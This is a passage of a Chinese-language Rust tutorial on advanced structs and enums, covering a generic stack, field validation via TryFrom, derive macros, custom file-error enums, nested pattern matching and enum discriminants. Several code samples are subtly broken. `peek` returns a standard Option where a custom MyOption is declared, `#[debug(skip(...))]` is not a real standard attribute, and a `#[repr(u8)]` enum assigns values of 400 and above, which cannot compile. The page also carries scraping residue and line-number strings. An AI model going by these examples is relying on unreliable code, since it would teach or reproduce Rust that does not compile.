<p>⚠️ <strong>三大高频错误点</strong>：</p>
<ol>
<li><strong>trait对象的对象安全问题</strong>：包含Self类型或泛型参数的方法会导致对象不安全</li>
<li><strong>泛型约束的类型不匹配</strong>：函数调用时实参类型不符合泛型结构体/枚举的约束条件</li>
<li><strong>字段验证与序列化属性配置错误</strong>：使用serde等库时，字段属性配置不当导致序列化失败</li>
</ol>
<h3 data-id="heading-3"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>二、结构体的高级用法</h3>
<h4 data-id="heading-4"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2.1 <a href="https://link.juejin.cn?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%25E6%25B3%259B%25E5%259E%258B%26spm%3D1001.2101.3001.7020" target="_blank" title="https://so.csdn.net/so/search?q=%E6%B3%9B%E5%9E%8B&amp;spm=1001.2101.3001.7020" ref="nofollow noopener noreferrer">泛型</a>结构体</h4>
<p>泛型结构体允许我们在定义时使用<strong>占位类型参数</strong>，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%25E5%25AE%259E%25E4%25BE%258B%25E5%258C%2596%26spm%3D1001.2101.3001.7020" target="_blank" title="https://so.csdn.net/so/search?q=%E5%AE%9E%E4%BE%8B%E5%8C%96&amp;spm=1001.2101.3001.7020" ref="nofollow noopener noreferrer">实例化</a>时指定具体类型，实现类型安全的代码复用。</p>
<p>⌨️ <strong>泛型结构体基本示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 定义一个泛型的Option类（类似标准库的Option&lt;T&gt;）</span>
<span class="hljs-meta">#[derive(Debug, PartialEq)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">MyOption</span>&lt;T&gt; {
    <span class="hljs-title function_ invoke__">Some</span>(T),
    <span class="hljs-literal">None</span>,
}

<span class="hljs-comment">// 定义一个泛型的栈数据结构</span>
<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Stack</span>&lt;T&gt; {
    data: <span class="hljs-type">Vec</span>&lt;T&gt;,
}

<span class="hljs-keyword">impl</span>&lt;T&gt; Stack&lt;T&gt; {
    <span class="hljs-comment">// 创建新的空栈</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Stack { data: <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>() }
    }

    <span class="hljs-comment">// 入栈操作</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">push</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, value: T) {
        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">push</span>(value);
    }

    <span class="hljs-comment">// 出栈操作</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">pop</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> MyOption&lt;T&gt; {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(value) = <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">pop</span>() {
            MyOption::<span class="hljs-title function_ invoke__">Some</span>(value)
        } <span class="hljs-keyword">else</span> {
            MyOption::<span class="hljs-literal">None</span>
        }
    }

    <span class="hljs-comment">// 获取栈顶元素（不弹出）</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">peek</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> MyOption&lt;&amp;T&gt; {
        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">last</span>().<span class="hljs-title function_ invoke__">map</span>(|value| value)
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 实例化存储i32类型的栈</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">int_stack</span> = Stack::<span class="hljs-title function_ invoke__">new</span>();
    int_stack.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">10</span>);
    int_stack.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">20</span>);
    int_stack.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">30</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"int_stack: {:?}"</span>, int_stack);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"peek: {:?}"</span>, int_stack.<span class="hljs-title function_ invoke__">peek</span>());  <span class="hljs-comment">// MyOption::Some(30)</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"pop: {:?}"</span>, int_stack.<span class="hljs-title function_ invoke__">pop</span>());  <span class="hljs-comment">// MyOption::Some(30)</span>

    <span class="hljs-comment">// 实例化存储String类型的栈</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">str_stack</span> = Stack::<span class="hljs-title function_ invoke__">new</span>();
    str_stack.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"Hello"</span>));
    str_stack.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"Rust"</span>));
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"str_stack: {:?}"</span>, str_stack);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"pop: {:?}"</span>, str_stack.<span class="hljs-title function_ invoke__">pop</span>());  <span class="hljs-comment">// MyOption::Some("Rust")</span>
}

AI写代码rust
运行
<span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556</span>
</code></pre>
<h4 data-id="heading-5"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2.2 结构体的字段验证</h4>
<p>在Rust中，我们可以通过<strong>自定义<code>new</code>方法</strong>或<strong>实现<code>TryFrom</code> trait</strong>来验证结构体字段的有效性，确保实例化后的对象满足业务规则。</p>
<p>⌨️ <strong>结构体字段验证示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::convert::TryFrom;
<span class="hljs-keyword">use</span> std::error::Error;
<span class="hljs-keyword">use</span> std::fmt;

<span class="hljs-comment">// 定义自定义错误类型</span>
<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ValidationError</span> {
    field: <span class="hljs-type">String</span>,
    message: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">fmt</span>::Display <span class="hljs-keyword">for</span> <span class="hljs-title class_">ValidationError</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">fmt</span>(&amp;<span class="hljs-keyword">self</span>, f: &amp;<span class="hljs-keyword">mut</span> fmt::Formatter&lt;<span class="hljs-symbol">'_</span>&gt;) <span class="hljs-punctuation">-&gt;</span> fmt::<span class="hljs-type">Result</span> {
        <span class="hljs-built_in">write!</span>(f, <span class="hljs-string">"{}: {}"</span>, <span class="hljs-keyword">self</span>.field, <span class="hljs-keyword">self</span>.message)
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Error</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ValidationError</span> {}

<span class="hljs-comment">// 定义用户结构体，包含字段验证逻辑</span>
<span class="hljs-meta">#[derive(Debug, PartialEq)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> {
    id: <span class="hljs-type">u32</span>,
    name: <span class="hljs-type">String</span>,
    email: <span class="hljs-type">String</span>,
    age: <span class="hljs-type">u8</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-comment">// 自定义new方法，返回Result类型</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(id: <span class="hljs-type">u32</span>, name: <span class="hljs-type">String</span>, email: <span class="hljs-type">String</span>, age: <span class="hljs-type">u8</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-keyword">Self</span>, ValidationError&gt; {
        <span class="hljs-comment">// 验证id是否大于0</span>
        <span class="hljs-keyword">if</span> id == <span class="hljs-number">0</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(ValidationError {
                field: <span class="hljs-string">"id"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
                message: <span class="hljs-string">"ID必须大于0"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
            });
        }

        <span class="hljs-comment">// 验证name长度是否在3-20个字符之间</span>
        <span class="hljs-keyword">if</span> name.<span class="hljs-title function_ invoke__">len</span>() &lt; <span class="hljs-number">3</span> || name.<span class="hljs-title function_ invoke__">len</span>() &gt; <span class="hljs-number">20</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(ValidationError {
                field: <span class="hljs-string">"name"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
                message: <span class="hljs-string">"姓名长度必须在3-20个字符之间"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
            });
        }

        <span class="hljs-comment">// 验证email是否包含@符号</span>
        <span class="hljs-keyword">if</span> !email.<span class="hljs-title function_ invoke__">contains</span>(<span class="hljs-string">'@'</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(ValidationError {
                field: <span class="hljs-string">"email"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
                message: <span class="hljs-string">"邮箱地址必须包含@符号"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
            });
        }

        <span class="hljs-comment">// 验证age是否在18-120岁之间</span>
        <span class="hljs-keyword">if</span> age &lt; <span class="hljs-number">18</span> || age &gt; <span class="hljs-number">120</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(ValidationError {
                field: <span class="hljs-string">"age"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
                message: <span class="hljs-string">"年龄必须在18-120岁之间"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
            });
        }

        <span class="hljs-title function_ invoke__">Ok</span>(User {
            id,
            name,
            email,
            age,
        })
    }
}

<span class="hljs-comment">// 实现TryFrom trait，从元组转换为User</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">TryFrom</span>&lt;(<span class="hljs-type">u32</span>, <span class="hljs-type">String</span>, <span class="hljs-type">String</span>, <span class="hljs-type">u8</span>)&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Error</span> = ValidationError;

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">try_from</span>(value: (<span class="hljs-type">u32</span>, <span class="hljs-type">String</span>, <span class="hljs-type">String</span>, <span class="hljs-type">u8</span>)) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-keyword">Self</span>, <span class="hljs-keyword">Self</span>::Error&gt; {
        <span class="hljs-keyword">Self</span>::<span class="hljs-title function_ invoke__">new</span>(value.<span class="hljs-number">0</span>, value.<span class="hljs-number">1</span>, value.<span class="hljs-number">2</span>, value.<span class="hljs-number">3</span>)
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 正确的用户信息</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">valid_user</span> = User::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"张三"</span>.<span class="hljs-title function_ invoke__">to_string</span>(), <span class="hljs-string">"zhangsan@example.com"</span>.<span class="hljs-title function_ invoke__">to_string</span>(), <span class="hljs-number">25</span>);
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Ok</span>(user) = valid_user {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"正确的用户信息: {:?}"</span>, user);
    }

    <span class="hljs-comment">// 错误的用户信息（姓名长度不足）</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">invalid_user1</span> = User::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"张"</span>.<span class="hljs-title function_ invoke__">to_string</span>(), <span class="hljs-string">"zhang@example.com"</span>.<span class="hljs-title function_ invoke__">to_string</span>(), <span class="hljs-number">30</span>);
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Err</span>(e) = invalid_user1 {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"错误的用户信息1: {:?}"</span>, e);
    }

    <span class="hljs-comment">// 使用TryFrom trait转换</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">user_tuple</span> = (<span class="hljs-number">3</span>, <span class="hljs-string">"李四"</span>.<span class="hljs-title function_ invoke__">to_string</span>(), <span class="hljs-string">"lisi@example.com"</span>.<span class="hljs-title function_ invoke__">to_string</span>(), <span class="hljs-number">28</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">user_from_tuple</span> = User::<span class="hljs-title function_ invoke__">try_from</span>(user_tuple);
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Ok</span>(user) = user_from_tuple {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"从元组转换的用户信息: {:?}"</span>, user);
    }
}

AI写代码rust
运行
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101</span>
</code></pre>
<h4 data-id="heading-6"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2.3 结构体的派生宏高级应用</h4>
<p>Rust标准库提供了<strong>10+个内置派生宏</strong>（如Debug、PartialEq、Clone、Copy、Hash等），我们可以通过<strong>属性配置</strong>来优化它们的行为，或者使用**第三方库（如derive_builder）**来生成更复杂的代码。</p>
<p>⌨️ <strong>结构体派生宏高级应用示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> derive_builder::Builder;  <span class="hljs-comment">// 需要在Cargo.toml中添加依赖：derive_builder = "0.12"</span>

<span class="hljs-comment">// 使用Debug的属性配置来美化输出</span>
<span class="hljs-meta">#[derive(Debug, PartialEq)]</span>
<span class="hljs-meta">#[debug(skip(field_to_skip))]</span>  <span class="hljs-comment">// 跳过field_to_skip字段的输出</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">DebugExample</span> {
    field1: <span class="hljs-type">i32</span>,
    field2: <span class="hljs-type">String</span>,
    field_to_skip: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;,
}

<span class="hljs-comment">// 使用derive_builder宏生成建造者模式的代码</span>
<span class="hljs-meta">#[derive(Debug, Builder)]</span>
<span class="hljs-meta">#[builder(pattern = <span class="hljs-string">"owned"</span>, setter(into, strip_option))]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Product</span> {
    name: <span class="hljs-type">String</span>,
    price: <span class="hljs-type">f64</span>,
    description: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">String</span>&gt;,
    stock: <span class="hljs-type">u32</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> ProductBuilder {
        ProductBuilder::<span class="hljs-title function_ invoke__">default</span>()
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// Debug属性配置示例</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">debug_example</span> = DebugExample {
        field1: <span class="hljs-number">10</span>,
        field2: <span class="hljs-string">"Hello, Rust!"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        field_to_skip: <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],
    };
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"DebugExample: {:?}"</span>, debug_example);

    <span class="hljs-comment">// 建造者模式示例</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">product</span> = Product::<span class="hljs-title function_ invoke__">new</span>()
        .<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">"Rust Programming Book"</span>)
        .<span class="hljs-title function_ invoke__">price</span>(<span class="hljs-number">99.0</span>)
        .<span class="hljs-title function_ invoke__">description</span>(<span class="hljs-string">"A comprehensive guide to Rust development"</span>)
        .<span class="hljs-title function_ invoke__">stock</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">"Failed to build product"</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Product: {:?}"</span>, product);
}

AI写代码rust
运行
<span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span>
</code></pre>
<h3 data-id="heading-7"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>三、枚举的高级用法</h3>
<h4 data-id="heading-8"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3.1 带泛型参数的枚举</h4>
<p>带泛型参数的枚举允许我们定义<strong>灵活的类型变体</strong>，例如标准库的<code>Result&lt;T, E&gt;</code>枚举就带了两个泛型参数，分别表示成功值和错误值。</p>
<p>⌨️ <strong>带泛型参数的枚举示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::error::Error;
<span class="hljs-keyword">use</span> std::fmt;
<span class="hljs-keyword">use</span> std::fs::File;
<span class="hljs-keyword">use</span> std::io::Read;
<span class="hljs-keyword">use</span> std::path::PathBuf;

<span class="hljs-comment">// 自定义文件操作错误类型</span>
<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">FileError</span> {
    <span class="hljs-title function_ invoke__">NotFound</span>(PathBuf),
    <span class="hljs-title function_ invoke__">PermissionDenied</span>(PathBuf),
    <span class="hljs-title function_ invoke__">ReadError</span>(PathBuf, <span class="hljs-type">String</span>),
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">fmt</span>::Display <span class="hljs-keyword">for</span> <span class="hljs-title class_">FileError</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">fmt</span>(&amp;<span class="hljs-keyword">self</span>, f: &amp;<span class="hljs-keyword">mut</span> fmt::Formatter&lt;<span class="hljs-symbol">'_</span>&gt;) <span class="hljs-punctuation">-&gt;</span> fmt::<span class="hljs-type">Result</span> {
        <span class="hljs-keyword">match</span> <span class="hljs-keyword">self</span> {
            FileError::<span class="hljs-title function_ invoke__">NotFound</span>(path) =&gt; <span class="hljs-built_in">write!</span>(f, <span class="hljs-string">"文件未找到: {}"</span>, path.<span class="hljs-title function_ invoke__">display</span>()),
            FileError::<span class="hljs-title function_ invoke__">PermissionDenied</span>(path) =&gt; <span class="hljs-built_in">write!</span>(f, <span class="hljs-string">"权限不足: {}"</span>, path.<span class="hljs-title function_ invoke__">display</span>()),
            FileError::<span class="hljs-title function_ invoke__">ReadError</span>(path, msg) =&gt; <span class="hljs-built_in">write!</span>(f, <span class="hljs-string">"读取文件失败: {} ({})"</span>, path.<span class="hljs-title function_ invoke__">display</span>(), msg),
        }
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Error</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">FileError</span> {}

<span class="hljs-comment">// 带泛型参数的文件操作结果类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">FileResult</span>&lt;T&gt; = <span class="hljs-type">Result</span>&lt;T, FileError&gt;;

<span class="hljs-comment">// 读取文件内容的函数</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">read_file_content</span>(path: PathBuf) <span class="hljs-punctuation">-&gt;</span> FileResult&lt;<span class="hljs-type">String</span>&gt; {
    <span class="hljs-comment">// 尝试打开文件</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">file</span> = <span class="hljs-keyword">match</span> File::<span class="hljs-title function_ invoke__">open</span>(&amp;path) {
        <span class="hljs-title function_ invoke__">Ok</span>(file) =&gt; file,
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-keyword">match</span> e.<span class="hljs-title function_ invoke__">kind</span>() {
            std::io::ErrorKind::NotFound =&gt; <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(FileError::<span class="hljs-title function_ invoke__">NotFound</span>(path)),
            std::io::ErrorKind::PermissionDenied =&gt; <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(FileError::<span class="hljs-title function_ invoke__">PermissionDenied</span>(path)),
            _ =&gt; <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(FileError::<span class="hljs-title function_ invoke__">ReadError</span>(path, e.<span class="hljs-title function_ invoke__">to_string</span>())),
        },
    };

    <span class="hljs-comment">// 尝试读取文件内容</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">content</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>();
    <span class="hljs-keyword">match</span> file.<span class="hljs-title function_ invoke__">read_to_string</span>(&amp;<span class="hljs-keyword">mut</span> content) {
        <span class="hljs-title function_ invoke__">Ok</span>(_) =&gt; <span class="hljs-title function_ invoke__">Ok</span>(content),
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-title function_ invoke__">Err</span>(FileError::<span class="hljs-title function_ invoke__">ReadError</span>(path, e.<span class="hljs-title function_ invoke__">to_string</span>())),
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 读取存在的文件</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">existing_file</span> = PathBuf::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"src/main.rs"</span>);
    <span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">read_file_content</span>(existing_file) {
        <span class="hljs-title function_ invoke__">Ok</span>(content) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"文件内容: {}"</span>, content),
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"错误: {}"</span>, e),
    }

    <span class="hljs-comment">// 读取不存在的文件</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">non_existent_file</span> = PathBuf::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"nonexistent.txt"</span>);
    <span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">read_file_content</span>(non_existent_file) {
        <span class="hljs-title function_ invoke__">Ok</span>(content) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"文件内容: {}"</span>, content),
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"错误: {}"</span>, e),
    }
}

AI写代码rust
运行
<span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364</span>
</code></pre>
<h4 data-id="heading-9"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3.2 枚举的嵌套模式匹配</h4>
<p>对于<strong>嵌套的枚举/结构体</strong>，我们可以使用<strong>嵌套模式匹配</strong>来简化代码，直接访问内部字段的值。</p>
<p>⌨️ <strong>枚举的嵌套模式匹配示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Message</span> {
    Quit,
    Move { x: <span class="hljs-type">i32</span>, y: <span class="hljs-type">i32</span> },
    <span class="hljs-title function_ invoke__">Write</span>(<span class="hljs-type">String</span>),
    ChangeColor { red: <span class="hljs-type">u8</span>, green: <span class="hljs-type">u8</span>, blue: <span class="hljs-type">u8</span> },
    SendData { id: <span class="hljs-type">u32</span>, payload: Payload },
}

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Payload</span> {
    <span class="hljs-title function_ invoke__">Text</span>(<span class="hljs-type">String</span>),
    <span class="hljs-title function_ invoke__">Binary</span>(<span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;),
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_message</span>(msg: Message) {
    <span class="hljs-keyword">match</span> msg {
        <span class="hljs-comment">// 简单匹配</span>
        Message::Quit =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"收到退出消息"</span>),

        <span class="hljs-comment">// 匹配结构体字段</span>
        Message::Move { x, y } <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span> &amp;&amp; y &gt; <span class="hljs-number">0</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"收到向右上方移动的消息: ({}, {})"</span>, x, y),
        Message::Move { x, y } =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"收到移动消息: ({}, {})"</span>, x, y),

        <span class="hljs-comment">// 匹配枚举字段</span>
        Message::<span class="hljs-title function_ invoke__">Write</span>(text) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"收到写入消息: {}"</span>, text),

        <span class="hljs-comment">// 匹配深层嵌套的字段</span>
        Message::SendData {
            id,
            payload: Payload::<span class="hljs-title function_ invoke__">Text</span>(text),
        } =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"收到文本数据: ID = {}, 内容 = {}"</span>, id, text),

        Message::SendData {
            id,
            payload: Payload::<span class="hljs-title function_ invoke__">Binary</span>(data),
        } =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"收到二进制数据: ID = {}, 长度 = {}"</span>, id, data.<span class="hljs-title function_ invoke__">len</span>()),

        <span class="hljs-comment">// 其他情况</span>
        _ =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"收到未知消息"</span>),
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 发送各种类型的消息</span>
    <span class="hljs-title function_ invoke__">process_message</span>(Message::Quit);
    <span class="hljs-title function_ invoke__">process_message</span>(Message::Move { x: <span class="hljs-number">10</span>, y: <span class="hljs-number">5</span> });
    <span class="hljs-title function_ invoke__">process_message</span>(Message::<span class="hljs-title function_ invoke__">Write</span>(<span class="hljs-string">"Hello, Rust!"</span>.<span class="hljs-title function_ invoke__">to_string</span>()));
    <span class="hljs-title function_ invoke__">process_message</span>(Message::ChangeColor { red: <span class="hljs-number">255</span>, green: <span class="hljs-number">0</span>, blue: <span class="hljs-number">0</span> });
    <span class="hljs-title function_ invoke__">process_message</span>(Message::SendData {
        id: <span class="hljs-number">1</span>,
        payload: Payload::<span class="hljs-title function_ invoke__">Text</span>(<span class="hljs-string">"This is a test message"</span>.<span class="hljs-title function_ invoke__">to_string</span>()),
    });
    <span class="hljs-title function_ invoke__">process_message</span>(Message::SendData {
        id: <span class="hljs-number">2</span>,
        payload: Payload::<span class="hljs-title function_ invoke__">Binary</span>(<span class="hljs-built_in">vec!</span>[<span class="hljs-number">0x48</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>]),
    });
}

AI写代码rust
运行
<span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758</span>
</code></pre>
<h4 data-id="heading-10"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3.3 枚举的判别式（Discriminant）</h4>
<p>Rust的枚举会自动为每个变体分配一个<strong>判别式</strong>（默认是0、1、2…），我们可以通过<code>std::mem::discriminant</code>函数来获取判别式的值，或者通过<strong>属性配置</strong>来指定自定义的判别式。</p>
<p>⌨️ <strong>枚举的判别式示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::mem;

<span class="hljs-comment">// 定义一个带自定义判别式的枚举</span>
<span class="hljs-meta">#[repr(u8)]</span>  <span class="hljs-comment">// 表示判别式的类型是u8</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">StatusCode</span> {
    <span class="hljs-literal">Ok</span> = <span class="hljs-number">200</span>,
    BadRequest = <span class="hljs-number">400</span>,
    Unauthorized = <span class="hljs-number">401</span>,
    Forbidden = <span class="hljs-number">403</span>,
